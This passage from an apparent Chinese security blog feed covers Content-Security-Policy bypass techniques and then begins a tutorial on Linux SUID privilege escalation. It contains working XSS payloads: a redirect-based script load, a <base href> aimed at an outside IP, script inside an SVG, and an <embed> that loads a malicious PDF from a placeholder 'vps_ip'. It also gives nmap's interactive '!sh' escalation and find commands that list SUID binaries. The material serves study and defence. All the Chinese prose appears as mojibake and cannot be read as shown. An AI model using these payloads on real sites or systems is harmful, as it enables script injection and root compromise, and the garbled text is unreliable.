class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹ä¸­CSPè®¾ç½®äº†<code>unsafe-eval</code>ç™½åå•ä¸º<code>www.google-analytics.com</code> ï¼Œè€Œ<code>www.google.analytics.com</code>ä¸­æä¾›äº†è‡ªå®šä¹‰javascriptçš„åŠŸèƒ½ï¼ˆgoogleä¼šå°è£…è‡ªå®šä¹‰çš„jsï¼Œæ‰€ä»¥è¿˜éœ€è¦<code>unsafe-eval</code>ï¼‰ï¼Œäºæ˜¯å¯ä»¥ç»•è¿‡CSP</p><h3 id="0x08-302è·³è½¬ç»•è¿‡"><a href="#0x08-302è·³è½¬ç»•è¿‡" class="headerlink" title="0x08 302è·³è½¬ç»•è¿‡"></a>0x08 302è·³è½¬ç»•è¿‡</h3><p><strong>æ¡ä»¶</strong></p><p>1.åœ¨script-srcå…è®¸çš„åŸŸä¸‹æœ‰éœ€è¦è·å–çš„ä¿¡æ¯</p><p>2.åœ¨script-srcå…è®¸çš„åŸŸä¸‹å­˜åœ¨ä»»æ„é‡å®šå‘</p><p><strong>demo</strong></p><p>aç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- csp.php --&gt;</span><br><span class="line">&lt;?php header(&quot;Content-Security-Policy: default-src &#39;self&#39;;script-src http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F;&quot;);?&gt; </span><br><span class="line">&lt;html&gt; &lt;head&gt; &lt;&#x2F;head&gt; &lt;body&gt;     csp header test  &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- redirect.php --&gt;</span><br><span class="line">&lt;?php header(&quot;Location: &quot; . $_GET[url]);?&gt;</span><br></pre></td></tr></table></figure><p>bç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- test.php --&gt;</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;script&gt;alert(123)&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨æ–¹æ³•</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F;redirect.php?url&#x3D;&#x2F;b&#x2F;test.php</span><br></pre></td></tr></table></figure><p>cspé™åˆ¶äº†<code>/a/</code>ç›®å½•ï¼Œè€Œæˆ‘ä»¬çš„ç›®æ ‡è„šæœ¬åœ¨<code>/b/</code>ç›®å½•ä¸‹åˆ™å¦‚æœè¿™æ—¶å€™è¯·æ±‚redirecté¡µé¢å»è®¿é—®<code>/b/</code>ä¸‹çš„è„šæœ¬æ˜¯å¯ä»¥é€šè¿‡cspçš„æ£€æŸ¥çš„</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162229814.png" class="" title="image-20210614162229814"><h3 id="0x09-Base-uriç»•è¿‡"><a href="#0x09-Base-uriç»•è¿‡" class="headerlink" title="0x09 Base-uriç»•è¿‡"></a>0x09 Base-uriç»•è¿‡</h3><p><strong>æ¡ä»¶</strong></p><ol><li><code>script-src</code>åªä½¿ç”¨<code>nonce</code></li><li>æ²¡æœ‰é¢å¤–è®¾ç½®base-uri</li><li>é¡µé¢å¼•ç”¨å­˜åœ¨ç›¸å¯¹è·¯å¾„çš„<code>&lt;script&gt;</code>æ ‡ç­¾</li></ol><p><strong>demo</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;//10.146.110.37/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&#x27;test&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162248786.png" class="" title="image-20210614162248786"><p>å¦‚æœæœªè®¾ç½®nonceå°†æ— æ³•ç»•è¿‡</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162255139.png" class="" title="image-20210614162255139"><h3 id="0x10-SVGç»•è¿‡"><a href="#0x10-SVGç»•è¿‡" class="headerlink" title="0x10 SVGç»•è¿‡"></a>0x10 SVGç»•è¿‡</h3><p><strong>æ¡ä»¶</strong></p><p>1.å¯ä»¥ä¸Šä¼ svgå›¾ç‰‡</p><p><strong>åˆ©ç”¨æ–¹æ³•</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;&lt;svg version&#x3D;&quot;1.1&quot; id&#x3D;&quot;Layer_1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; x&#x3D;&quot;0px&quot; y&#x3D;&quot;0px&quot; width&#x3D;&quot;100px&quot; height&#x3D;&quot;100px&quot; viewBox&#x3D;&quot;0 0 751 751&quot; enable-background&#x3D;&quot;new 0 0 751 751&quot; xml:space&#x3D;&quot;preserve&quot;&gt;  &lt;image id&#x3D;&quot;image0&quot; width&#x3D;&quot;751&quot; height&#x3D;&quot;751&quot; x&#x3D;&quot;0&quot; y&#x3D;&quot;0&quot;    href&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; &#x2F;&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><h3 id="0x11-CRLFç»•è¿‡"><a href="#0x11-CRLFç»•è¿‡" class="headerlink" title="0x11 CRLFç»•è¿‡"></a>0x11 CRLFç»•è¿‡</h3><p>å½“é¡µé¢å­˜åœ¨CRLFæ¼æ´æ—¶ï¼Œä¸”è¿”å›çš„CSPå¤´åœ¨æˆ‘ä»¬å¯æ§ç‚¹çš„ä¸‹æ–¹ï¼Œåˆ™å¯é€šè¿‡å›è½¦æ¢è¡Œæ³¨å…¥CSPè¿”å›å¤´ç»•è¿‡ã€‚è¯¥ç»•è¿‡æ–¹æ³•è¾ƒç®€å•ï¼Œè¿™é‡Œå°±ä¸¾ä¾‹äº†</p><h3 id="0x12-object-srcç»•è¿‡ï¼ˆPDFXSSï¼‰"><a href="#0x12-object-srcç»•è¿‡ï¼ˆPDFXSSï¼‰" class="headerlink" title="0x12 object-srcç»•è¿‡ï¼ˆPDFXSSï¼‰"></a>0x12 object-srcç»•è¿‡ï¼ˆPDFXSSï¼‰</h3><p>åœ¨CSPæ ‡å‡†é‡Œé¢ï¼Œæœ‰ä¸€ä¸ªå±æ€§æ˜¯<code>object-src</code>ï¼Œå®ƒé™åˆ¶çš„æ˜¯<code>&lt;embed&gt;</code> <code>&lt;object&gt;</code> <code>&lt;applet&gt;</code>æ ‡ç­¾çš„srcï¼Œä¹Ÿå°±æ˜¯æ’ä»¶çš„src<br>äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ’ä»¶æ¥æ‰§è¡ŒJavascriptä»£ç ï¼Œæ’ä»¶çš„jsä»£ç å¹¶ä¸å—<code>script-src</code>çš„çº¦æŸ</p><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p><ol><li>æ²¡æœ‰è®¾ç½®<code>object-src</code>ï¼Œæˆ–è€…<code>object-src</code>æ²¡æœ‰è®¾ç½®ä¸º<code>&#39;none&#39;</code></li><li>pdfç”¨çš„æ˜¯chromeçš„é»˜è®¤è§£æå™¨</li></ol><p><strong>demo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;&quot;&gt;&lt;?php echo $_GET[&#39;xss&#39;]?&gt;</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡æ–¹æ³•</strong></p><p>æ„é€ pdfçš„XSSæ”¾åœ¨vpsä¸Š</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162329478.png" class="" title="image-20210614162329478"><p>ç„¶ååœ¨XSSå¤„å†™å…¥embedæ ‡ç­¾ä¸”srcä¸ºpdfè¿æ¥</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip/123.pdf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162334912.png" class="" title="image-20210614162334912"><p>ä½†æ˜¯PDFçš„XSSå¹¶ä¸æ˜¯ä¸ºæ‰€æ¬²ä¸ºï¼Œæ¯”å¦‚pdf-xsså¹¶ä¸èƒ½è·å–é¡µé¢cookieï¼Œä½†æ˜¯å¯ä»¥å¼¹çª—ï¼Œurlè·³è½¬ç­‰</p><p>å…·ä½“èƒ½æ‰§è¡Œå“ªäº›æ¶æ„jså¯ä»¥å‚è€ƒè¿™ç¯‡<a class="link"   href="https://blog.csdn.net/microzone/article/details/52850623" >æ–‡ç« <i class="fas fa-external-link-alt"></i></a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a class="link"   href="https://mp.weixin.qq.com/s/RgIQi5rQA7EO3iDFEQbVCA" >CSPæµ…æä¸ç»•è¿‡<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/5084" >æˆ‘çš„CSPç»•è¿‡æ€è·¯åŠæ€»ç»“<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.jianshu.com/p/f1de775bc43e" >CSPç­–ç•¥åŠç»•è¿‡æ–¹æ³•<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://cloud.tencent.com/developer/chapter/13541" >CSPå¼€å‘è€…æ‰‹å†Œâ€“è…¾è®¯äº‘<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://paper.seebug.org/423" >å‰ç«¯é˜²å¾¡ä»å…¥é—¨åˆ°å¼ƒå‘â€“CSPå˜è¿<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>suidææƒå­¦ä¹ </title>
      <link href="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨pç‰›åšå®¢çœ‹åˆ°æœ‰å…³suidææƒçš„<a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >æ–‡ç« <i class="fas fa-external-link-alt"></i></a>ï¼Œæ‰€ä»¥æ‰“ç®—å¯¹linux suidææƒè¿™å—å­¦ä¹ è®°å½•ä¸‹ï¼Œç”±äºæ˜¯é¦–æ¬¡æ¥è§¦suidçš„æ¦‚å¿µï¼Œæ‰€ä»¥æ–‡ç« å‰é¢å®šä¹‰éƒ¨åˆ†è®°å½•çš„æ¯”è¾ƒè¯¦ç»†ï¼ˆå•°å—¦ï¼‰ï¼Œä»¥ä¾¿åç»­å­¦ä¹ ã€‚</p><h2 id="0x01-ä»€ä¹ˆæ˜¯SUID"><a href="#0x01-ä»€ä¹ˆæ˜¯SUID" class="headerlink" title="0x01 ä»€ä¹ˆæ˜¯SUID"></a>0x01 ä»€ä¹ˆæ˜¯SUID</h2><h3 id="1-1-SUID"><a href="#1-1-SUID" class="headerlink" title="1.1 SUID"></a>1.1 SUID</h3><p>SUIDå…¨ç§°æ˜¯Set owner User ID up on executionï¼Œsuidæ˜¯èµ‹äºˆäºŒè¿›åˆ¶æ–‡ä»¶ä¸€ä¸ªæƒé™ï¼Œå®ƒå…è®¸ç¨‹åºæ‰§è¡Œè€…åœ¨æ‰§è¡Œæ—¶å…·æœ‰è¯¥ç¨‹åºçš„æ‹¥æœ‰è€…(owner)çš„æƒé™ï¼Œå¯¹äºSUIDæƒé™çš„æ–‡ä»¶åŸºæœ¬æœ‰è¿™æ ·çš„é™åˆ¶ä¸åŠŸèƒ½ï¼š</p><ul><li><strong>SUIDæƒé™ä»…å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰æ•ˆ</strong></li><li><strong>æ‰§è¡Œè€…å¯¹äºè¯¥ç¨‹åºéœ€è¦å…·æœ‰xçš„å¯æ‰§è¡Œæƒé™</strong></li><li><strong>æœ¬æƒé™ä»…åœ¨æ‰§è¡Œè¯¥ç¨‹åºçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆï¼ˆrun-timeï¼‰</strong></li><li><strong>æ‰§è¡Œè€…å°†å…·æœ‰è¯¥ç¨‹åºæ‹¥æœ‰è€…çš„ï¼ˆownerï¼‰æƒé™</strong></li></ul><p>è¿™é‡Œä¸¾ä¸ªæ —å­è¯´æ˜ä¸‹ï¼Œlinuxä¸­æ¯ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç éƒ½å­˜å‚¨åœ¨<code>/etc/shadow</code>æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶çš„æƒé™ä¸º<code>-rw-r-----</code>ï¼Œæ™®é€šç”¨æˆ·æ— æ³•ç›´æ¥ä¿®æ”¹ï¼Œä½†æ¯ä¸ªç”¨æˆ·éƒ½å¯ä»¥é€šè¿‡<code>passwd</code>å‘½ä»¤æ¥ä¿®æ”¹è‡ªå·±çš„å¯†ç ï¼Œä¸ºä»€ä¹ˆ/etc/shadowåªå…è®¸rootç”¨æˆ·è¯»å–ä¿®æ”¹çš„ï¼Œæ™®é€šç”¨æˆ·å´èƒ½å¤Ÿä¿®æ”¹è¿™ä¸ªæ–‡ä»¶å†…çš„å¯†ç å‘¢ï¼Ÿè¿™å°±æ˜¯SUIDçš„ä½œç”¨ã€‚</p><p><code>passwd</code>å‘½ä»¤å¯¹åº”çš„è·¯å¾„æ˜¯<code>/usr/bin/passwd</code>ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒçš„æ–‡ä»¶æƒé™ä¸º<code>-rwsr-xr-x</code>ï¼Œè¿™é‡Œ<code>passwd</code>è®¾ç½®äº†SUIDæƒé™ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹æ™®é€šç”¨æˆ·testerå¦‚ä½•é€šè¿‡SUIDæƒé™å®Œæˆä¿®æ”¹å¯†ç æ“ä½œçš„ï¼š</p><ol><li>tester ç”¨æˆ·å¯¹äº /usr/bin/passwd è¿™ä¸ªç¨‹åºå…·æœ‰æ‰§è¡Œæƒé™ï¼Œå› æ­¤å¯ä»¥æ‰§è¡Œ passwd ç¨‹åº</li><li>passwd ç¨‹åºçš„æ‰€æœ‰è€…ä¸º root</li><li>tester ç”¨æˆ·æ‰§è¡Œ passwd ç¨‹åºçš„è¿‡ç¨‹ä¸­ä¼šæš‚æ—¶è·å¾— root æƒé™</li><li>å› æ­¤ tester ç”¨æˆ·åœ¨æ‰§è¡Œ passwd ç¨‹åºçš„è¿‡ç¨‹ä¸­å¯ä»¥ä¿®æ”¹ /etc/shadow æ–‡ä»¶</li></ol><p>æ™®é€šç”¨æˆ·ç›´æ¥ä½¿ç”¨<code>cat</code>æŸ¥çœ‹<code>/etc/shadow</code>æ–‡ä»¶æ˜¯è¢«ç¦æ­¢çš„ï¼Œè¿™é‡Œç”¨ä¸€å¼ ç¤ºæ„å›¾æ¥è¡¨ç¤ºä¸¤è€…åŒºåˆ«</p><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174007691-528388363.png" class="" title="img"><p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒSUIDä»…å¯ç”¨äºäºŒè¿›åˆ¶ç¨‹åºä¸Šï¼Œ<strong>ä½†ä¸èƒ½å¤Ÿç”¨åœ¨shellè„šæœ¬ä¸Šé¢</strong>ã€‚è¿™æ˜¯å› ä¸ºshellè„šæœ¬æ˜¯ç”±å¤šä¸ªäºŒè¿›åˆ¶æ‰§è¡Œæ–‡ä»¶è¿›è¡Œè°ƒç”¨æ‰§è¡Œè€Œå·²ï¼Œæ‰€ä»¥æ˜¯å¦æœ‰SUIDæƒé™è¿˜æ˜¯çœ‹è°ƒç”¨çš„äºŒè¿›åˆ¶æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œä¸æ˜¯shellè„šæœ¬æœ¬èº«ã€‚å½“ç„¶ï¼Œ<strong>SUIDå¯¹äºç›®å½•ä¹Ÿæ˜¯æ— æ•ˆçš„</strong>ã€‚</p><p>åœ¨æœç´¢å­¦ä¹ SUIDæ—¶ä¹Ÿäº†è§£åˆ°äº†SGIDã€SBITçš„å®šä¹‰ï¼Œè¿™é‡Œä¹Ÿé¡ºå¸¦æä¸‹</p><h3 id="1-2-SGID"><a href="#1-2-SGID" class="headerlink" title="1.2 SGID"></a>1.2 SGID</h3><p>ä¸SUIDä¸åŒçš„æ˜¯ï¼ŒSGIDå¯ä»¥é’ˆå¯¹æ–‡ä»¶æˆ–ç›®å½•æ¥è®¾ç½®ã€‚å¦‚æœæ˜¯å¯¹æ–‡ä»¶æ¥è¯´ï¼ŒSGIDæœ‰å¦‚ä¸‹çš„åŠŸèƒ½ï¼š</p><ul><li>SGIDå¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰ç”¨</li><li>ç¨‹åºæ‰§è¡Œè€…å¯¹äºè¯¥ç¨‹åºæ¥è¯´ï¼Œéœ€å…·å¤‡xçš„æƒé™</li><li>æ‰§è¡Œè€…åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å°†ä¼šè·å¾—æ”¹ç¨‹åºç”¨æˆ·ç»„çš„æ”¯æŒ</li></ul><p>ä¸¾ä¸ªæ —å­ï¼Œä½¿ç”¨<code>/usr/bin/locate</code>è¿™ä¸ªç¨‹åºå¯ä»¥å»æŸ¥æ‰¾<code>/var/lib/mlocate/mlocate.db</code>è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼ŒæŸ¥çœ‹å¯¹åº”æ–‡ä»¶æƒé™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 24 Nov 17  2020 /usr/bin/locate -&gt; /etc/alternatives/locate</span><br><span class="line">lrwxrwxrwx 1 root root 16 Nov 17  2020 /etc/alternatives/locate -&gt; /usr/bin/mlocate</span><br><span class="line"><span class="meta">#</span><span class="bash"> locateæ˜¯è½¯é“¾æ¥æŒ‡å‘mlocateï¼Œæ‰€ä»¥ä¿®æ”¹è½¯è¿æ¥locateçš„sgidæƒé™ä¹Ÿå°±æ˜¯ä¿®æ”¹mlocate</span></span><br><span class="line">-rwxr-sr-x 1 root mlocate 39608 Nov 15  2018 /usr/bin/mlocate</span><br><span class="line">-rw-r----- 1 root mlocate 1292585 Jun 26 14:25 /var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä½¿ç”¨æ™®é€šç”¨æˆ·testeræ‰§è¡Œlocateæ—¶ï¼Œtesterå°†ä¼šå–å¾—mlocateç»„çš„æ”¯æŒï¼Œå› æ­¤å°±å¯ä»¥å»è¯»å–mlocate.dbçš„å†…å®¹äº†ã€‚æ‰§è¡Œè¿‡ç¨‹ç¤ºæ„å›¾å¦‚ä¸‹</p><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174309311-990901650.png" class="" title="img"><p>å¦å¤–ï¼ŒSGIDå¯¹ç›®å½•ä¹Ÿæ”¯æŒï¼Œå½“ç”¨æˆ·å¯¹æŸä¸€ç›®å½•æœ‰å†™å’Œæ‰§è¡Œæƒé™æ—¶ï¼Œè¯¥ç”¨æˆ·å°±å¯ä»¥åœ¨è¯¥ç›®å½•ä¸‹å»ºç«‹æ–‡ä»¶ï¼Œå¦‚æœè¯¥ç›®å½•ç”¨ SGID ä¿®é¥°ï¼Œåˆ™è¯¥ç”¨æˆ·åœ¨è¿™ä¸ªç›®å½•ä¸‹å»ºç«‹çš„æ–‡ä»¶éƒ½æ˜¯å±äºè¿™ä¸ªç›®å½•æ‰€å±çš„ç»„ã€‚å¦‚ä¸‹å›¾ç¤ºä¾‹ï¼Œsgidtestç›®å½•å±äºrootç»„ï¼Œä¸”èµ‹äºˆäº†SGIDæƒé™ï¼Œpoomç”¨æˆ·åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å°†ä¸ºrootå±ç»„ã€‚</p><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231049994.png" class="" title="image-20210626231049994"><h3 id="1-3-SBIT"><a href="#1-3-SBIT" class="headerlink" title="1.3 SBIT"></a>1.3 SBIT</h3><p>å…¶å® SBIT ä¸ SUID å’Œ SGID çš„å…³ç³»å¹¶ä¸å¤§ã€‚SBIT æ˜¯ the restricted deletion flag or sticky bit çš„ç®€ç§°ã€‚SBIT ç›®å‰åªå¯¹ç›®å½•æœ‰æ•ˆï¼Œç”¨æ¥é˜»æ­¢éæ–‡ä»¶çš„æ‰€æœ‰è€…åˆ é™¤æ–‡ä»¶ã€‚æ¯”è¾ƒå¸¸è§çš„ä¾‹å­å°±æ˜¯ /tmp ç›®å½•ï¼š</p><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231156650.png" class="" title="image-20210626231156650"><p>æƒé™ä¿¡æ¯ä¸­æœ€åä¸€ä½ t è¡¨æ˜è¯¥ç›®å½•è¢«è®¾ç½®äº† SBIT æƒé™ã€‚SBIT å¯¹ç›®å½•çš„ä½œç”¨æ˜¯ï¼šå½“ç”¨æˆ·åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæ–°æ–‡ä»¶æˆ–ç›®å½•æ—¶ï¼Œä»…æœ‰è‡ªå·±å’Œ root æ‰æœ‰æƒåŠ›åˆ é™¤ã€‚</p><h3 id="1-4-å¦‚ä½•è®¾ç½®SUIDã€SGIDã€SBITæƒé™"><a href="#1-4-å¦‚ä½•è®¾ç½®SUIDã€SGIDã€SBITæƒé™" class="headerlink" title="1.4 å¦‚ä½•è®¾ç½®SUIDã€SGIDã€SBITæƒé™"></a>1.4 å¦‚ä½•è®¾ç½®SUIDã€SGIDã€SBITæƒé™</h3><p>SUIDã€SGIDã€SBITæƒé™å¯¹åº”çš„æ•°å­—ä¸º<code>SUID-&gt;4ï¼ŒSGID-&gt;2ï¼ŒSBIT-&gt;1</code></p><p>é€šè¿‡æ•°å­—æ³•è®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 4755 filename</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç¬¦å·æ³•è®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename</span><br><span class="line">chmod g+s filename </span><br><span class="line">chmod o+s filename</span><br></pre></td></tr></table></figure><p>è‹¥æƒé™ä¸ºå¤§å†™Sæˆ–Tï¼Œåˆ™è¯´æ˜user/group/othersæœ¬èº«å°±æ²¡æœ‰æ‰§è¡Œæƒé™ã€‚</p><h2 id="0x02-å…³äºSUIDææƒ"><a href="#0x02-å…³äºSUIDææƒ" class="headerlink" title="0x02 å…³äºSUIDææƒ"></a>0x02 å…³äºSUIDææƒ</h2><p>å…ˆä»‹ç»ä¸‹linuxè¿›ç¨‹åœ¨è¿è¡Œæ—¶æœ‰3ä¸ªUID:</p><ul><li>Real UID æ‰§è¡Œè¯¥è¿›ç¨‹çš„ç”¨æˆ·å®é™…çš„UID</li><li>Effective UID ç¨‹åºå®é™…æ“ä½œæ—¶ç”Ÿæ•ˆçš„UIDï¼ˆæ¯”å¦‚å†™å…¥æ–‡ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªUIDæ˜¯å¦æœ‰æƒé™ï¼‰</li><li>Saved UID åœ¨é«˜æƒé™ç”¨æˆ·é™æƒåï¼Œä¿ç•™çš„å…¶åŸæœ¬UID</li></ul><p>åœ¨è®¾ç½®äº†SUIDæƒé™çš„ç¨‹åºåœ¨å…¶è¿è¡Œæ—¶ï¼Œè¿›ç¨‹çš„Effective UIDå°†ä¸ºç¨‹åºçš„æ‹¥æœ‰è€…ã€‚ä¾‹å¦‚å‰é¢è¯´çš„<code>/user/bin/passwd</code>å‘½ä»¤çš„æƒé™ä¸º<code>-rwsr-xr-x</code>ï¼Œç¨‹åºçš„æ‹¥æœ‰è€…ä¸ºrootï¼ˆuid=0ï¼‰ï¼Œæ™®é€šç”¨æˆ·åœ¨æ‰§è¡Œ<code>passwd</code>å‘½ä»¤æ—¶Effective UIDå°±ä¸º0ï¼Œæ‰€ä»¥å¯ä»¥å®Œæˆæ›´æ”¹å¯†ç çš„æ“ä½œã€‚</p><p>æˆ‘ä»¬çŸ¥é“nmapéœ€è¦è¿›è¡ŒUDPæˆ–TCP SYNæ‰«ææ—¶éœ€è¦ç”¨åˆ°rootæƒé™ï¼Œæ‰€ä»¥å¾ˆå¤šç®¡ç†å‘˜ä¼šç»™nmapåŠ ä¸ŠSUIDæƒé™ï¼Œè¿™æ ·æ™®é€šç”¨æˆ·å°±å¯ä»¥éšä¾¿ä½¿ç”¨nmapäº†ã€‚åœ¨nmap 5.20ç‰ˆæœ¬ä»¥å‰å­˜åœ¨interactiveäº¤äº’æ¨¡å¼ï¼Œå½“nmapè®¾ç½®äº†SUIDæƒé™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å…¥äº¤äº’æ¨¡å¼è¾“å…¥<code>!sh</code>ææƒã€‚</p><p>æ‰€ä»¥<strong>æ‹¥æœ‰SUIDçš„ç¨‹åºå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´æˆ–å…¶æœ¬èº«å­˜åœ¨æ‰§è¡Œå‘½ä»¤çš„åŠŸèƒ½ï¼Œä¸”è¿™ä¸ªç¨‹åºæ‰€æœ‰è€…çš„uidä¸º0æˆ–å…¶ä»–super user</strong>ï¼Œé‚£ä¹ˆå°±æœ‰SUIDææƒçš„é£é™©ã€‚</p><p><strong>å¦‚ä½•æŸ¥æ‰¾å…·æœ‰SUIDæƒé™çš„æ–‡ä»¶</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯é€šè¿‡<code>sudo -l</code>åˆ—å‡ºå½“å‰ç”¨æˆ·å¯sudoæ‰§è¡Œçš„å‘½ä»¤</p><h2 id="0x03-å¸¸ç”¨äºSUIDææƒçš„å‘½ä»¤"><a 